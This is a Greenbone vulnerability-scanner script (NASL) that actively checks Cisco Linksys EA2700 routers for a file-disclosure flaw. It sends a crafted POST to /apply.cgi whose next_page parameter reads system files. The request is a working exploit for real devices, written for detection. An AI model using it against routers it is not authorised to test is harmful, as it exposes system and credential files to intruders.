# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103698");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2013-04-16 14:16:54 +0200 (Tue, 16 Apr 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Cisco Linksys EA2700 Router <= 1.0.12.128947 Multiple Security Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("CISCO");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("EA2700/banner");

  script_tag(name:"summary", value:"Cisco Linksys EA2700 routers are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - A security bypass vulnerability

  - A cross-site request forgery (CSRF) vulnerability

  - A cross-site scripting (XSS) vulnerability");

  script_tag(name:"impact", value:"An attacker can exploit these issues to bypass certain security
  restrictions, steal cookie-based authentication credentials, gain access to system and other
  configuration files, or perform unauthorized actions in the context of a user session.");

  script_tag(name:"affected", value:"Cisco Linksys EA2700 running firmware 1.0.12.128947 and
  probably prior.");

  script_tag(name:"solution", value:"Firmware updates are available.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210123081243/http://www.securityfocus.com/bid/59054");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (!banner || "EA2700" >!< banner)
  exit(0);

files = traversal_files("linux");

foreach pattern (keys(files)) {
  file = files[pattern];

  url = "/apply.cgi";

  headers = make_array("Content-Type", "application/x-www-form-urlencoded");

  data = "submit_button=Wireless_Basic&change_action=gozila_cgi&next_page=/" + file;

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

  if (egrep(string: res, pattern: pattern, icase: TRUE)) {
    report = "It was possible to obtain the file '" + file + "' via a crafted HTTP POST request to " +
             http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
